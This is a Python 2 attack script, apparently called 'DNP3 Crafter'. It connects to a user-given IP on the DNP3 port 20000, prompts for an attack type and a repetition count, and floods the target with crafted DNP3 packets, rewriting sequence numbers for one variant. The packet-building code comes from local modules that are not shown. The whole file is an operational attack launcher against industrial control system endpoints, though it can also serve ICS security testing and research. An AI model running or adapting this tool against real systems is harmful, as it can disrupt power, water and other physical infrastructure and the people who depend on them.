#! /usr/bin/env python

import os
import sys
import socket
import time
import struct
import binascii

"import self-make Lib"
current_dir = os.getcwd()
path_to_lib = current_dir+"/Lib"
sys.path.insert(0, path_to_lib)

from AttackType import *
from Send import *

"Constants"
sendOnly = False
''''''
if __name__ == "__main__":

	print "    ___     __   ___  _____    ___              __  _              "
	print "   /   \ /\ \ \ / _ \|___ /   / __\_ __  __ _  / _|| |_  ___  _ __ "
	print "  / /\ //  \/ // /_)/  |_ \  / /  | '__|/ _` || |_ | __|/ _ \| '__|"
	print " / /_/// /\  // ___/  ___) |/ /___| |  | (_| ||  _|| |_|  __/| |   "
	print "/___,' \_\ \/ \/     |____/ \____/|_|   \__,_||_|   \__|\___||_|\n "

	if len(sys.argv) != 2:
		print '\nMissing arguments!'
		print 'Try ./emisor.py dst-ip'
		print 'Exiting...'
		quit()

	ipdst = sys.argv[1]
	destport= 20000   #DNP3 standard port

	''' Open default python socket '''

	mysocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	mysocket.connect((ipdst,destport))

	print_attack_type()

	dnp3_packet,attack_number = attack_type()

	print 'Choose number of repetitions:'

	attack_count = int(raw_input())
	''' Perform selected attack '''

	i = 0
	if attack_number > 1:
    		packet = dnp3_packet
		while (i < attack_count):
    			send_dnp3_packet(mysocket,packet,sendOnly)
			i=i+1
			time.sleep(0.02) #Time lapse between packets (in seconds)
			print 'Sent' , i , 'repetitions...'
	else:
		packet,header,nonSeqPayload=dnp3_packet
		while (i < attack_count):
			send_dnp3_packet(mysocket,packet,sendOnly)
			packet = update_seq(header,nonSeqPayload)
			i=i+1
			time.sleep(0.02) #Time lapse between packets (in seconds)
			print 'Sent' , i , 'repetitions...'

	print ''
	print 'Finished.\n'
	mysocket.close()

